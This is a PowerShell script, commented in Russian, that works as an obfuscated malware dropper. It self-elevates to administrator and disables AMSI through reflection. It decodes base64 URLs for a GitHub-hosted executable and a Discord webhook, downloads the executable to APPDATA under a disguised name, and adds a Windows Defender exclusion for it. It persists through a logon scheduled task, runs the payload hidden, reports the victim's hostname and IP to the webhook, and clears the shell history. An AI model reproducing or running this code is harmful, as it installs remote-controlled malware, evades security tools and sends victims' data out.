$s = [Security.Principal.WindowsBuiltInRole]::Administrator
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole($s)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Маскировка имен через переменные
$a = "System.Management.Automation.A" + "msi" + "Utils"
$f = "am" + "si" + "Init" + "Failed"

# Попытка тихого патча через рефлексию (обфусцировано)
try {
    $m = [Ref].Assembly.GetType($a)
    if ($m) {
        $m.GetField($f, 'NonPublic,Static').SetValue($null, $true)
    }
} catch {}

# Данные (Base64)
$w_b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwMDIwMDIwNTU0MTMxMDQ2NC85UGZudUlKX1VULTd2M2xvZXQ3RjMyWFZHUS01U0dtdUhMa1lFVEUtcjl0MG9sZFRMd3d2TXg1WXNQX0oyZVRuWFhtaw=="
$e_b64 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3dpbnN0YXJjaGlrL0ZGRi9tYWluL1hDbGllbnQuZXhl"

$url_w = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($w_b64))
$url_e = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($e_b64))
$path = "$env:APPDATA\win_sys_helper.exe"

function Send-Report($msg) {
    try {
        $ip = (iwr "https://api.ipify.org" -UseBasicParsing).Content
        $json = @{ content = "[$env:COMPUTERNAME] $msg (IP: $ip)" } | ConvertTo-Json
        Invoke-RestMethod -Uri $url_w -Method Post -Body $json -ContentType "application/json"
    } catch {}
}

try {
    # Скачивание через скрытый WebClient
    $net = New-Object "Net.Web" + "Client"
    $net.DownloadFile($url_e, $path)
    
    # Добавление в исключения (через запуск процесса, а не прямую команду)
    $exc = "Add-MpPre" + "ference -Exclusio" + "nPath '$path'"
    powershell -WindowStyle Hidden -Command "$exc"

    # Закрепление в системе
    $task = "WinNetHelper"
    if (!(Get-ScheduledTask $task -ErrorAction SilentlyContinue)) {
        $act = New-ScheduledTaskAction -Execute $path
        $trg = New-ScheduledTaskTrigger -AtLogOn
        Register-ScheduledTask -Action $act -Trigger $trg -TaskName $task -RunLevel Highest -Force | Out-Null
    }

    # Скрытый запуск
    Start-Process -FilePath $path -WindowStyle Hidden
    Send-Report "Execution successful"
} catch {
    Send-Report "Error: $($_.Exception.Message)"
}

# Чистка хвостов
Clear-History
